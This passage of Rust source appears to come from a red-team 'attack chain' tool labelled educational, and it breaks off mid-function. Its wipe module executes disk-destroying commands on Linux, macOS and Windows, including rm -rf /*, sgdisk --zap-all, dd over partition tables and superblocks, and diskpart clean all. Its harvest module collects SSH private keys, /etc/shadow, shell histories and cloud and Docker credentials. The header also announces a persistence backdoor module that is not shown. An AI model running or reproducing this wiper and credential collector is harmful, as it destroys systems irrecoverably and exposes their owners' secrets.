//! 攻击链工具模块（教育用途 / 红队演练）
//!
//! 基于 docs/attack-defense-notes.md 的思路，按模块实现：
//!   - wipe:    自毁 / 抹盘
//!   - harvest: 敏感文件 / 凭据回收
//!   - persist: 投放持久化后门
//!
//! ⚠ 安全说明：wipe 和 persist 默认 dry-run（仅打印不执行），
//!   需 `--execute` 标志并确认后才能实际运行。harvest 只读，安全。

use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

/// 检测当前平台
pub fn detect_platform() -> &'static str {
    if cfg!(target_os = "windows") {
        "windows"
    } else if cfg!(target_os = "linux") {
        "linux"
    } else if cfg!(target_os = "macos") {
        "macos"
    } else {
        "unknown"
    }
}

fn resolve_platform(requested: &str) -> &'static str {
    match requested {
        "auto" => detect_platform(),
        "linux" => "linux",
        "windows" => "windows",
        "macos" => "macos",
        _ => "unknown",
    }
}

// ─── Module 1: Wipe (自毁/抹盘) ────────────────────────────────────────────

/// 抹盘级别
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum WipeLevel {
    /// 仅清分区表（MBR/GPT）
    Mbr,
    /// 整盘覆写（shred/dd）
    Shred,
    /// 完整破坏：rm -rf + 清分区表
    Full,
}

impl WipeLevel {
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "mbr" | "mbr_only" => Some(Self::Mbr),
            "shred" => Some(Self::Shred),
            "full" => Some(Self::Full),
            _ => None,
        }
    }
}

/// Windows 下使用的 shell 类型
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum WipeShell {
    /// cmd /c（Windows 经典命令提示符，Win2008R2+ 兼容）
    Cmd,
    /// powershell -Command（PowerShell 5.1，Win2012+ 内置）
    PowerShell,
    /// pwsh -Command（PowerShell 7，需额外安装）
    Pwsh,
    /// nu -c（Nushell，需额外安装）
    Nu,
}

impl WipeShell {
    pub fn from_str(s: &str) -> Self {
        match s.to_lowercase().as_str() {
            "cmd" => Self::Cmd,
            "powershell" | "ps" | "ps5" | "powershell5" => Self::PowerShell,
            "pwsh" | "ps7" | "powershell7" | "powershell core" => Self::Pwsh,
            "nu" | "nushell" => Self::Nu,
            _ => Self::Cmd, // 默认 fallback
        }
    }
}

/// 打印抹盘计划（Linux）
fn print_wipe_plan_linux(level: WipeLevel) {
    println!("┌─ Wipe Plan (Linux) ─────────────────────────");
    match level {
        WipeLevel::Mbr => {
            println!("│ 快速模式 — 清分区表 + 文件系统元数据");
            println!("│");
            println!("│ 【清分区表】");
            println!("│ 方案 A（推荐，需安装 gdisk 包）:");
            println!("│   sgdisk --zap-all /dev/sda");
            println!("│   → 一次性清除：MBR保护区 + GPT主头(LBA1) + 主分区表(LBA2~33)");
            println!("│         + GPT备份头(磁盘末LBA) + 备份分区表(磁盘末-33~末-1)");
            println!("│");
            println!("│ 方案 B（纯 dd，无需额外工具）:");
            println!("│   1. dd if=/dev/zero of=/dev/sda bs=512 count=34");
            println!("│      → 清 GPT 主头 + 主分区表（LBA 0~33）");
            println!("│   2. SZ=$(blockdev --getsz /dev/sda) \\");
            println!("│      && dd if=/dev/zero of=/dev/sda bs=512 count=34 \\");
            println!("│         seek=$((SZ - 34))");
            println!("│      → 清 GPT 备份头 + 备份分区表（磁盘末 34 扇区）");
            println!("│");
            println!("│ 【清文件系统元数据 — 不碰文件本身，但文件系统直接废掉】");
            println!("│   1. dd if=/dev/zero of=/dev/sda1 bs=1024 count=4 seek=1");
            println!("│      → 清 ext4 superblock（偏移 1024 字节处）");
            println!("│      → ext4 有备份 superblock，需要全清：");
            println!("│        for i in 1 3 5 7 9 11 13 15 17 19 21 23 25 27 29 31; do");
            println!("│          dd if=/dev/zero of=/dev/sda1 bs=1024 count=4 seek=$i; done");
            println!("│   2. dd if=/dev/zero of=/dev/sda2 bs=512 count=1");
            println!("│      → 清 xfs superblock（LBA 0 即 superblock）");
            println!("│   3. pvremove /dev/sda3");
            println!("│      → 清 LVM 物理卷标签（LBA 1 的 PV label）");
            println!("│      或: dd if=/dev/zero of=/dev/sda3 bs=512 count=1 seek=1");
            println!("│   4. dd if=/dev/zero of=/dev/sda4 bs=512 count=1");
            println!("│      → 清 btrfs superblock（LBA 0）");
        }
        WipeLevel::Shred => {
            println!("│ 慢速模式 — 整盘覆写（耗时极长）");
            println!("│");
            println!("│   shred -vfz -n 3 /dev/sda");
            println!("│   → 3 次随机覆写 + 最后零填充");
        }
        WipeLevel::Full => {
            println!("│ 完全破坏 — 删文件 + 清分区表");
            println!("│");
            println!("│ 1. rm -rf /* 2>/dev/null");
            println!("│    → 递归删除根目录所有文件");
            println!("│ 2. sgdisk --zap-all /dev/sda");
            println!("│    → 清 GPT 双头 + 分区表，系统无法重启");
        }
    }
    println!("└──────────────────────────────────────────────");
}

/// 打印抹盘计划（macOS）
///
/// macOS 有 SIP（System Integrity Protection）保护：
/// - SIP 开启（默认）：只能操作用户目录（~/）、非系统路径
/// - SIP 关闭：可操作全盘，包括 /System、/usr、原始磁盘设备
fn print_wipe_plan_macos(level: WipeLevel) {
    println!("┌─ Wipe Plan (macOS) ────────────────────────");
    println!("│ ℹ  macOS 有 SIP 保护，策略分为两档：");
    match level {
        WipeLevel::Mbr => {
            println!("│");
            println!("│ 快速模式 — diskutil eraseDisk（类似快速格式化）");
            println!("│   diskutil eraseDisk JHFS+ Wiped /dev/disk0");
            println!("│   → 一次性清除：数据卷 + 恢复分区（iBoot）+ 分区表");
            println!("│   → GPT 主头 + 备份头 + 分区表项全部清掉");
            println!("│   → 兼容 Intel 和 Apple Silicon（M 芯片）");
            println!("│");
            println!("│ 慢速模式 — dd 清分区表头尾");
            println!("│   1. dd if=/dev/zero of=/dev/disk0 bs=512 count=34");
            println!("│      → 清 GPT 主头 + 主分区表（LBA 0~33）");
            println!("│   2. SZ=$(diskutil info /dev/disk0 | grep 'Total Size' | awk '{{print $NF}}')");
            println!("│      dd if=/dev/zero of=/dev/disk0 bs=512 count=34 seek=$((SZ/512 - 34))");
            println!("│      → 清 GPT 备份头 + 备份分区表（磁盘末尾）");
            println!("│");
            println!("│ 【清文件系统元数据 — 不碰文件本身】");
            println!("│   1. dd if=/dev/zero of=/dev/disk0s2 bs=512 count=1");
            println!("│      → 清 APFS 卷 superblock（APSB，LBA 0 即卷头）");
            println!("│      → APFS 容器有多个卷，每个卷都有 APSB：");
            println!("│        for vol in /dev/disk0s1 /dev/disk0s2 /dev/disk0s3; do");
            println!("│          dd if=/dev/zero of=$vol bs=512 count=1; done");
            println!("│   2. dd if=/dev/zero of=/dev/disk0s1 bs=512 count=1");
            println!("│      → 清 EFI 系统分区 VBR（FAT32 引导扇区）");
            println!("│");
            println!("│ [SIP 开启时以上命令均需 sudo，且 dd 只能操作用户分区]");
            println!("│   SIP 下 diskutil eraseDisk 仍可用（需重启进恢复模式）");
        }
        WipeLevel::Shred => {
            println!("│");
            println!("│ 慢速模式 — 整盘覆写（耗时极长）");
            println!("│");
            println!("│ [SIP 开启 — 只能覆写用户空间]");
            println!("│   diskutil secureErase 0 /dev/disk0s2  # 零填充用户分区");
            println!("│");
            println!("│ [SIP 关闭 — 可整盘 shred]");
            println!("│   1. diskutil unmountDisk /dev/disk0");
            println!("│   2. dd if=/dev/urandom of=/dev/disk0 bs=1M");
            println!("│      → 整盘随机覆写（耗时极长）");
        }
        WipeLevel::Full => {
            println!("│");
            println!("│ 完全破坏 — 删文件 + 抹盘（需 SIP 关闭进恢复模式）");
            println!("│");
            println!("│ [SIP 开启 — 清理用户 + 重装系统]");
            println!("│   1. rm -rf ~/*");
            println!("│   2. rm -rf /Library /Applications /usr/local");
            println!("│   3. 重启进恢复模式 → 磁盘工具 → 抹掉整个磁盘 → 重装 macOS");
            println!("│");
            println!("│ [SIP 关闭 — 完全破坏]");
            println!("│   1. rm -rf /* 2>/dev/null");
            println!("│   2. diskutil eraseDisk JHFS+ Wiped /dev/disk0");
            println!("│      → 完整抹盘（清 GPT 双头 + 恢复分区 + 重建文件系统）");
            println!("│   3. dd if=/dev/zero of=/dev/disk0 bs=512 count=34");
            println!("│      → 补一刀清分区表（双重保险）");
        }
    }
    println!("└──────────────────────────────────────────────");
}

/// 打印抹盘计划（Windows），按 shell 类型显示对应命令
fn print_wipe_plan_windows(level: WipeLevel, shell: WipeShell) {
    let shell_name = match shell {
        WipeShell::Cmd => "cmd",
        WipeShell::PowerShell => "powershell 5.1",
        WipeShell::Pwsh => "powershell 7 (pwsh)",
        WipeShell::Nu => "nushell",
    };
    println!("┌─ Wipe Plan (Windows) — Shell: {} ────", shell_name);
    match level {
        WipeLevel::Mbr => match shell {
            WipeShell::Cmd => {
                println!("│ 快速模式 — diskpart clean");
                println!("│   diskpart /s wipe.txt");
                println!("│   (内含: select disk 0 → clean → exit)");
                println!("│   → diskpart clean 自动清除 GPT 主头 + 备份头 + 分区表项");
                println!("│   → 兼容 MBR 和 GPT 双分区表，Win2008R2+ 内置无需额外工具");
                println!("│");
                println!("│ 【清文件系统元数据 — 不碰文件本身】");
                println!("│   1. dd if=\\\\.\\C: bs=512 count=16 | head -c 8192 >nul");
                println!("│      → 清 NTFS VBR（前 16 扇区，含引导代码 + BPB）");
                println!("│   2. fsutil mftinfo C: 或直接 dd 清 $MFT 前 1MB");
                println!("│      但由于 Windows 锁定卷，需在 WinPE 下操作：");
                println!("│      diskpart → select volume C → offline");
                println!("│      → dd / fsutil 操作元数据后再 online");
                println!("│   3. 或干脆用 diskpart clean all 直接全盘零填充");
            }
            WipeShell::PowerShell | WipeShell::Pwsh => {
                println!("│ 快速模式 — Clear-Disk cmdlet");
                println!("│   Clear-Disk -Number 0 -RemoveData -Confirm:$false");
                println!("│   → 自动清除 GPT 主头 + 备份头 + 分区表项");
                println!("│   → 兼容 MBR 和 GPT（PowerShell 原生 cmdlet）");
                println!("│");
                println!("│ 【清文件系统元数据 — 不碰文件本身】");
                println!("│   1. Clear-VolumeMeta -DriveLetter C  # 需第三方模块");
                println!("│   2. 或: Format-Volume C: -FileSystem NTFS -Force");
                println!("│      → 快速格式化重建文件系统元数据");
            }
            WipeShell::Nu => {
                println!("│ 快速模式 — Nushell 调 diskpart");
                println!("│   ^diskpart /s wipe.txt");
                println!("│   → diskpart clean 自动清 GPT 双头 + 分区表项");
                println!("│   → 兼容 MBR + GPT");
            }
        },
        WipeLevel::Shred => match shell {
            WipeShell::Cmd => {
                println!("│ 1. cipher /w:C:");
                println!("│    → Windows 内置覆写未用空间");
                println!("│ 2. diskpart → clean (清分区表)");
                println!("│    ⚠ cipher 只能覆写未用空间，不能整盘覆写");
            }
            WipeShell::PowerShell | WipeShell::Pwsh => {
                println!("│ 1. cipher /w:C:");
                println!("│    → 覆写未用空间");
                println!("│ 2. Clear-Disk -Number 0 -RemoveData -RemoveOEM -Confirm:$false");
                println!("│    → 清分区表 + OEM 分区");
            }
            WipeShell::Nu => {
                println!("│ 1. ^cipher /w:C:");
                println!("│    → 覆写未用空间");
                println!("│ 2. ^diskpart /s wipe.txt → clean all");
                println!("│    → 清分区表");
            }
        },
        WipeLevel::Full => match shell {
            WipeShell::Cmd => {
                println!("│ 1. rd /s /q C:\\");
                println!("│    → 递归删除 C 盘所有目录");
                println!("│ 2. del /f /s /q C:\\*.* >nul 2>&1");
                println!("│    → 删除所有文件");
                println!("│ 3. diskpart → clean all");
                println!("│    → 清分区表 + 全盘零填充");
            }
            WipeShell::PowerShell | WipeShell::Pwsh => {
                println!("│ 1. Remove-Item -Recurse -Force C:\\* -ErrorAction SilentlyContinue");
                println!("│    → 递归删除 C 盘所有内容");
                println!("│ 2. Clear-Disk -Number 0 -RemoveData -RemoveOEM -Confirm:$false");
                println!("│    → 清分区表 + OEM 分区");
            }
            WipeShell::Nu => {
                println!("│ 1. rm -rf C:\\*");
                println!("│    → Nushell 原生递归删除");
                println!("│ 2. ^diskpart /s wipe.txt → clean all");
                println!("│    → 清分区表");
            }
        },
    }
    println!("└──────────────────────────────────────────────");
}

/// 执行抹盘命令（Linux - 实际危险操作）
///
/// # Safety
/// 此函数会破坏系统，仅应在受控环境调用。
unsafe fn execute_wipe_linux(level: WipeLevel) {
    eprintln!("\n⚠  WARNING: Executing destructive wipe on Linux!");
    match level {
        WipeLevel::Mbr => {
            // ── 清分区表（GPT 主头 + 备份头）──
            let status = Command::new("sgdisk")
                .args(["--zap-all", "/dev/sda"])
                .status();
            if let Ok(_) = status {
                // sgdisk 成功，无需 fallback
            } else {
                // fallback: 纯 dd 清 GPT 主头 + 备份头
                let _ = Command::new("dd")
                    .args(["if=/dev/zero", "of=/dev/sda", "bs=512", "count=34"])
                    .status();
                let _ = Command::new("sh")
                    .args(["-c", "SZ=$(blockdev --getsz /dev/sda 2>/dev/null) && dd if=/dev/zero of=/dev/sda bs=512 count=34 seek=$((SZ - 34)) 2>/dev/null"])
                    .status();
            }

            // ── 清文件系统元数据（不碰文件本身）──
            // ext4 superblock（偏移 1024 字节，主 + 备份 superblock）
            let _ = Command::new("sh")
                .args(["-c", "for i in 1 3 5 7 9 11 13 15 17 19 21 23 25 27 29 31; do dd if=/dev/zero of=/dev/sda1 bs=1024 count=4 seek=$i 2>/dev/null; done"])
                .status();
            // xfs superblock（LBA 0）
            let _ = Command::new("dd")
                .args(["if=/dev/zero", "of=/dev/sda2", "bs=512", "count=1"])
                .status();
            // LVM 物理卷标签（LBA 1）
            let _ = Command::new("sh")
                .args(["-c", "pvremove /dev/sda3 2>/dev/null; dd if=/dev/zero of=/dev/sda3 bs=512 count=1 seek=1 2>/dev/null"])
                .status();
            // btrfs superblock（LBA 0）
            let _ = Command::new("dd")
                .args(["if=/dev/zero", "of=/dev/sda4", "bs=512", "count=1"])
                .status();
        }
        WipeLevel::Shred => {
            let _ = Command::new("shred")
                .args(["-vfz", "-n", "3", "/dev/sda"])
                .status();
        }
        WipeLevel::Full => {
            let _ = Command::new("rm")
                .args(["-rf", "/*"])
                .status();
            let _ = Command::new("sgdisk")
                .args(["--zap-all", "/dev/sda"])
                .status();
        }
    }
}

/// 执行抹盘命令（Windows - 实际危险操作）
///
/// # Safety
/// 此函数会破坏系统，仅应在受控环境调用。
#[cfg(target_os = "windows")]
unsafe fn execute_wipe_windows(level: WipeLevel, shell: WipeShell) {
    eprintln!("\n⚠  WARNING: Executing destructive wipe on Windows with shell: {:?}!", shell);
    match shell {
        WipeShell::Cmd => execute_wipe_windows_cmd(level),
        WipeShell::PowerShell => execute_wipe_windows_powershell(level),
        WipeShell::Pwsh => execute_wipe_windows_pwsh(level),
        WipeShell::Nu => execute_wipe_windows_nu(level),
    }
}

/// 用 cmd 执行抹盘
#[cfg(target_os = "windows")]
unsafe fn execute_wipe_windows_cmd(level: WipeLevel) {
    match level {
        WipeLevel::Mbr => {
            let script = "select disk 0\nclean\nexit\n";
            run_diskpart_script(&script);
            // 在线状态下 NTFS 卷被锁定，无法直接清 VBR/MFT
            // 需在 WinPE 下执行（见 print plan 说明）
        }
        WipeLevel::Shred => {
            let _ = Command::new("cipher").args(["/w:C:"]).status();
            let script = "select disk 0\nclean all\nexit\n";
            run_diskpart_script(&script);
        }
        WipeLevel::Full => {
            let _ = Command::new("cmd")
                .args(["/c", "rd /s /q C:\\"])
                .status();
            let _ = Command::new("cmd")
                .args(["/c", "del /f /s /q C:\\*.* >nul 2>&1"])
                .status();
            let script = "select disk 0\nclean all\nexit\n";
            run_diskpart_script(&script);
        }
    }
}

/// 用 PowerShell 5.1 执行抹盘
#[cfg(target_os = "windows")]
unsafe fn execute_wipe_windows_powershell(level: WipeLevel) {
    match level {
        WipeLevel::Mbr => {
            let _ = Command::new("powershell")
                .args(["-Command", "Clear-Disk -Number 0 -RemoveData -Confirm:$false"])
                .status();
        }
        WipeLevel::Shred => {
            let _ = Command::new("cipher").args(["/w:C:"]).status();
            let _ = Command::new("powershell")
                .args(["-Command", "Clear-Disk -Number 0 -RemoveData -RemoveOEM -Confirm:$false"])
                .status();
        }
        WipeLevel::Full => {
            let _ = Command::new("powershell")
                .args(["-Command", "Remove-Item -Recurse -Force C:\\* -ErrorAction SilentlyContinue"])
                .status();
            let _ = Command::new("powershell")
                .args(["-Command", "Clear-Disk -Number 0 -RemoveData -RemoveOEM -Confirm:$false"])
                .status();
        }
    }
}

/// 用 PowerShell 7 (pwsh) 执行抹盘
#[cfg(target_os = "windows")]
unsafe fn execute_wipe_windows_pwsh(level: WipeLevel) {
    match level {
        WipeLevel::Mbr => {
            let _ = Command::new("pwsh")
                .args(["-Command", "Clear-Disk -Number 0 -RemoveData -Confirm:$false"])
                .status();
        }
        WipeLevel::Shred => {
            let _ = Command::new("cipher").args(["/w:C:"]).status();
            let _ = Command::new("pwsh")
                .args(["-Command", "Clear-Disk -Number 0 -RemoveData -RemoveOEM -Confirm:$false"])
                .status();
        }
        WipeLevel::Full => {
            let _ = Command::new("pwsh")
                .args(["-Command", "Remove-Item -Recurse -Force C:\\* -ErrorAction SilentlyContinue"])
                .status();
            let _ = Command::new("pwsh")
                .args(["-Command", "Clear-Disk -Number 0 -RemoveData -RemoveOEM -Confirm:$false"])
                .status();
        }
    }
}

/// 用 Nushell 执行抹盘
#[cfg(target_os = "windows")]
unsafe fn execute_wipe_windows_nu(level: WipeLevel) {
    match level {
        WipeLevel::Mbr => {
            let script = "select disk 0\nclean\nexit\n";
            run_diskpart_script(&script);
        }
        WipeLevel::Shred => {
            let _ = Command::new("cipher").args(["/w:C:"]).status();
            let script = "select disk 0\nclean all\nexit\n";
            run_diskpart_script(&script);
        }
        WipeLevel::Full => {
            let _ = Command::new("nu")
                .args(["-c", "rm -rf C:\\*"])
                .status();
            let script = "select disk 0\nclean all\nexit\n";
            run_diskpart_script(&script);
        }
    }
}

/// 运行 diskpart 脚本
#[cfg(target_os = "windows")]
fn run_diskpart_script(script: &str) {
    if let Ok(path) = std::env::temp_dir().join("wipe_diskpart.txt").into_os_string().into_string() {
        let _ = fs::write(&path, script);
        let _ = Command::new("diskpart").args(["/s", &path]).status();
        let _ = fs::remove_file(&path);
    }
}

#[cfg(not(target_os = "windows"))]
unsafe fn execute_wipe_windows(_level: WipeLevel, _shell: WipeShell) {
    eprintln!("Not on Windows — cannot execute Windows wipe commands.");
}

/// 执行抹盘命令（macOS - 实际危险操作）
///
/// # Safety
/// 此函数会破坏系统，仅应在受控环境调用。
///
/// SIP 开启时只能操作用户文件；SIP 关闭可操作全盘 + 原始设备。
#[cfg(target_os = "macos")]
unsafe fn execute_wipe_macos(level: WipeLevel) {
    eprintln!("\n⚠  WARNING: Executing destructive wipe on macOS!");
    // macOS 上 SIP 状态检测
    let sip_enabled = check_macos_sip();
    if sip_enabled {
        eprintln!("ℹ  SIP is ENABLED — only user files will be wiped.");
    } else {
        eprintln!("ℹ  SIP is DISABLED — full disk wipe available.");
    }

    match level {
        WipeLevel::Mbr => {
            if sip_enabled {
                // SIP 开启：只能清用户目录
                let _ = Command::new("rm")
                    .args(["-rf",
                        "~/Documents", "~/Desktop", "~/Downloads",
                        "~/Pictures", "~/Movies", "~/Music",
                        "~/Library/Caches", "~/Library/Application\\ Support",
                        "~/.ssh", "~/.aws", "~/.config",
                    ])
                    .status();
            } else {
                // SIP 关闭：快速模式 — diskutil eraseDisk（清 recovery + 分区表 + GPT 双头）
                let _ = Command::new("diskutil")
                    .args(["eraseDisk", "JHFS+", "Wiped", "/dev/disk0"])
                    .status();

                // 补一刀清 APFS 卷 superblock（APSB），每个卷头 LBA 0
                let _ = Command::new("sh")
                    .args(["-c", "for vol in /dev/disk0s1 /dev/disk0s2 /dev/disk0s3; do dd if=/dev/zero of=$vol bs=512 count=1 2>/dev/null; done"])
                    .status();
            }
        }
        WipeLevel::Shred => {
            if sip_enabled {
                // SIP 开启：安全擦除用户分区
                let _ = Command::new("diskutil")
                    .args(["secureErase", "0", "/dev/disk0s2"])
                    .status();
            } else {
                // SIP 关闭：慢速模式 — 整盘覆写
                let _ = Command::new("diskutil").args(["unmountDisk", "/dev/disk0"]).status();
                let _ = Command::new("dd")
                    .args(["if=/dev/urandom", "of=/dev/disk0", "bs=1M"])
                    .status();
            }
        }
        WipeLevel::Full => {
            if sip_enabled {
                // SIP 开启：清用户 + 非系统目录
                let _ = Command::new("rm").args(["-rf", "~/*"]).status();
                let _ = Command::new("rm")
                    .args(["-rf", "/Library", "/Applications", "/usr/local"])
                    .status();
            } else {
                // SIP 关闭：完全破坏
                let _ = Command::new("rm").args(["-rf", "/*"]).status();
                // 快速抹盘（清 recovery + 分区表 + GPT 双头）
                let _ = Command::new("diskutil")
                    .args(["eraseDisk", "JHFS+", "Wiped", "/dev/disk0"])
                    .status();
                // 补一刀清分区表头尾（双重保险）
                let _ = Command::new("dd")
                    .args(["if=/dev/zero", "of=/dev/disk0", "bs=512", "count=34"])
                    .status();
            }
        }
    }
}

/// 检测 macOS SIP 状态
#[cfg(target_os = "macos")]
fn check_macos_sip() -> bool {
    let output = Command::new("csrutil")
        .arg("status")
        .output();
    match output {
        Ok(out) => {
            let s = String::from_utf8_lossy(&out.stdout);
            // "enabled" 或 "disabled" 在输出中
            s.contains("enabled")
        }
        Err(_) => {
            // 拿不到 csrutil 时保守假设 SIP 开启
            true
        }
    }
}

#[cfg(not(target_os = "macos"))]
unsafe fn execute_wipe_macos(_level: WipeLevel) {
    eprintln!("Not on macOS — cannot execute macOS wipe commands.");
}

/// 确认提示
fn confirm_destructive(msg: &str) -> bool {
    eprintln!("{}", msg);
    eprint!("Type 'yes' to confirm: ");
    use std::io::{self, BufRead};
    let stdin = io::stdin();
    if let Some(line) = stdin.lock().lines().next() {
        let input = line.unwrap_or_default().trim().to_lowercase();
        input == "yes"
    } else {
        false
    }
}

/// 运行 wipe 模块
pub fn run_wipe(platform: &str, level: &str, shell: &str, execute: bool, yes: bool) {
    let plat = resolve_platform(platform);
    let lvl = WipeLevel::from_str(level).unwrap_or(WipeLevel::Mbr);
    let sh = if plat == "windows" { WipeShell::from_str(shell) } else { WipeShell::Cmd };

    println!("\n═══ Module 1: Wipe (自毁/抹盘) ═══");
    println!("  Platform  : {}", plat);
    println!("  Level     : {:?}", lvl);
    if plat == "windows" {
        println!("  Shell     : {:?}", sh);
    }
    println!("  Mode      : {}\n", if execute { "EXECUTE" } else { "DRY-RUN" });

    match plat {
        "linux" => print_wipe_plan_linux(lvl),
        "windows" => print_wipe_plan_windows(lvl, sh),
        "macos" => print_wipe_plan_macos(lvl),
        other => {
            eprintln!("Unsupported platform: {}", other);
            return;
        }
    }

    if execute {
        let confirmed = yes || confirm_destructive("\n⚠  Destructive operation! This will destroy the system.");
        if !confirmed {
            println!("Aborted.");
            return;
        }
        println!("Executing...");
        match plat {
            "linux" => unsafe { execute_wipe_linux(lvl); },
            "windows" => unsafe { execute_wipe_windows(lvl, sh); },
            "macos" => unsafe { execute_wipe_macos(lvl); },
            _ => {}
        }
    }
}

// ─── Module 2: Harvest (敏感文件/凭据回收) ──────────────────────────────────

/// 收集项
#[derive(Debug, serde::Serialize)]
pub struct HarvestItem {
    pub path: String,
    pub exists: bool,
    pub size: u64,
    pub content_summary: String,
}

/// 收集结果
#[derive(Debug, serde::Serialize)]
pub struct HarvestReport {
    pub platform: String,
    pub items: Vec<HarvestItem>,
    pub total_files: usize,
    pub total_size: u64,
}

/// Linux 收集路径清单
const LINUX_HARVEST_PATHS: &[(&str, &str)] = &[
    // SSH 密钥
    ("ssh_auth", "~/.ssh/authorized_keys"),
    ("ssh_auth_root", "/root/.ssh/authorized_keys"),
    ("ssh_config", "~/.ssh/config"),
    ("ssh_privkey", "~/.ssh/id_rsa"),
    ("ssh_privkey_ed25519", "~/.ssh/id_ed25519"),
    ("ssh_known_hosts", "~/.ssh/known_hosts"),
    // 用户口令
    ("shadow", "/etc/shadow"),
    ("passwd", "/etc/passwd"),
    // 历史记录
    ("bash_history", "~/.bash_history"),
    ("zsh_history", "~/.zsh_history"),
    ("python_history", "~/.python_history"),
    ("mysql_history", "~/.mysql_history"),
    ("psql_history", "~/.psql_history"),
    // 云凭据
    ("aws_cred", "~/.aws/credentials"),
    ("aws_config", "~/.aws/config"),
    ("gcloud", "~/.config/gcloud/application_default_credentials.json"),
    ("azure", "~/.azure/azureProfile.json"),
    ("docker_config", "~/.docker/config.json"),
    ("kube_config", "~/.kube/config"),
    // 启动脚本
    ("bashrc", "~/.bashrc"),
    ("bash_profile", "~/.bash_profile"),
    ("profile", "~/.profile"),
    // 系统配置
    ("sshd_config", "/etc/ssh/sshd_config"),
    ("crontab", "/var/spool/cron/"),
];

/// Windows 收集路径清单
const WINDOWS_HARVEST_PATHS: &[(&str, &str)] = &[
    ("ssh_auth", "C:\\ProgramData\\ssh\\administrators_authorized_keys"),
    ("ssh_config", "C:\\ProgramData\\ssh\\ssh_config"),
    ("ps_history", "%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"),
    ("cmd_history", "%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"),
    ("aws_cred", "%USERPROFILE%\\.aws\\credentials"),
    ("aws_config", "%USERPROFILE%\\.aws\\config"),
    ("docker_config", "%USERPROFILE%\\.docker\\config.json"),
    ("kube_config", "%USERPROFILE%\\.kube\\config"),
];

fn expand_path(path: &str) -> PathBuf {
    if path.starts_with("~/") {
        if let Some(home) = dirs_next_home() {
            return PathBuf::from(path.replacen("~/", &format!("{}/", home.display()), 1));
        }
    }
    if cfg!(target_os = "windows") && path.contains("%") {
        // 简单环境变量展开
        let mut expanded = path.to_string();
        for (var, val) in [
            ("%APPDATA%", std::env::var("APPDATA").ok()),
            ("%USERPROFILE%", std::env::var("USERPROFILE").ok()),
            ("%HOMEDRIVE%", std::env::var("HOMEDRIVE").ok()),
            ("%HOMEPATH%", std::env::var("HOMEPATH").ok()),
        ] {
            if let Some(v) = val {
                expanded = expanded.replace(var, &v);
            }
        }
        return PathBuf::from(expanded);
    }
    PathBuf::from(path)
}

fn dirs_next_home() -> Option<PathBuf> {
    std::env::var("HOME").ok().map(PathBuf::from)
        .or_else(|| {
            if cfg!(target_os = "windows") {
                std::env::var("USERPROFILE").ok().map(PathBuf::from)
            } else {
                None
            }
        })
}

fn collect_item(path: &str) -> HarvestItem {
    let p = expand_path(path);
    let meta = fs::metadata(&p);
    match meta {
        Ok(m) => {
            let size = m.len();
            let content_summary = if m.is_dir() {
                format!("<directory>")
            } else if size > 1024 * 10 {
                // 只读前 10KB
                match fs::read_to_string(&p) {
                    Ok(s) => {
                        let preview: String = s.chars().take(200).collect();
                        format!("{}... (truncated, {} bytes)", preview, size)
                    }
                    Err(_) => "<binary or unreadable>".to_string(),
                }
            } else {
                match fs::read_to_string(&p) {
                    Ok(s) => s.chars().take(200).collect(),
                    Err(_) => "<binary or unreadable>".to_string(),
                }
            };
            HarvestItem {
                path: path.to_string(),
                exists: true,
                size,
                content_summary,
            }
        }
        Err(_) => HarvestItem {
            path: path.to_string(),
            exists: false,
            size: 0,
            content_summary: String::new(),
        },
    }
}

/// 收集 Linux 凭据
fn collect_linux() -> Vec<HarvestItem> {
    let mut items = Vec::new();
    for (_, path) in LINUX_HARVEST_PATHS {
        // 展开通配路径 /var/spool/cron/ → 列出目录
        if *path == "/var/spool/cron/" {
            let p = Path::new("/var/spool/cron");
            if p.is_dir() {
                let mut dir_summary = String::new();
                if let Ok(entries) = fs::read_dir(p) {
                    for entry in entries.flatten() {
                        if let Ok(name) = entry.file_name().into_string() {
                            if !dir_summary.is_empty() {
                                dir_summary.push_str(", ");
                            }
                            dir_summary.push_str(&name);
                        }
                    }
                }
                items.push(HarvestItem {
                    path: path.to_string(),
                    exists: true,
                    size: 0,
                    content_summary: if dir_summary.is_empty() {
                        "<empty directory>".to_string()
                    } else {
                        format!("crontabs: {}", dir_summary)
                    },
                });
            } else {
                items.push(HarvestItem {
                    path: path.to_string(),
                    exists: false,
                    size: 0,
                    content_summary: String::new(),
                });
            }
        } else {
            items.push(collect_item(path));
        }
    }
    items
}

/// 收集 Windows 凭据
fn collect_windows() -> Vec<HarvestItem> {
    let mut items = Vec::new();
    for (_, path) in WINDOWS_HARVEST_PATHS {
        items.push(collect_item(path));
    }

    // 额外：cmdkey /list
    let cmdkey_output = Command::new("cmd")
        .args(["/c", "cmdkey /list"])
        .output();
    let cmdkey_summary = match cmdkey_output {
        Ok(o) if o.status.success() => {
            String::from_utf8_lossy(&o.stdout).to_string()
        }
        _ => "<failed to run cmdkey>".to_string(),
    };
    items.push(HarvestItem {
        path: "cmdkey /list".to_string(),
        exists: !cmdkey_summary.is_empty(),
        size: cmdkey_summary.len() as u64,
        content_summary: cmdkey_summary.chars().take(200).collect(),
    });

    items
}

/// 打印收集报告
fn print_harvest_report(report: &HarvestReport) {
    println!("\n═══ Harvest Report ═══");
    println!("  Platform    : {}", report.platform);
    println!("  Total files : {}", report.total_files);
    println!("  Total size  : {} bytes", report.total_size);
    println!();

    for item in &report.items {
        let status = if item.exists { "✔" } else { "✘" };
        println!("  {} {} ({} bytes)", status, item.path, item.size);
        if item.exists && !item.content_summary.is_empty() {
            // 缩写打印
            let preview: String = item.content_summary.chars().take(120).collect();
            if item.content_summary.len() > 120 {
                println!("     → {}...", preview);
            } else {
                println!("     → {}", preview);
            }
        }
    }
}

/// 运行 harvest 模块
pub fn run_harvest(platform: &str, output: Option<&str>, as_zip: bool) {
    let plat = resolve_platform(platform);

    println!("\n═══ Module 2: Harvest (敏感文件/凭据回收) ═══");
    println!("  Platform  : {}", plat);
    println!("  Output    : {}", output.unwrap_or("(stdout)"));
    println!("  Zip       : {}\n", as_zip);

    let items = match plat {
        "linux" => collect_linux(),
        "windows" => collect_windows(),
        "macos" => {
            println!("⚠ macOS 不在目标范围内，尝试 Linux 路径收集...");
            collect_linux()
        }
        other => {
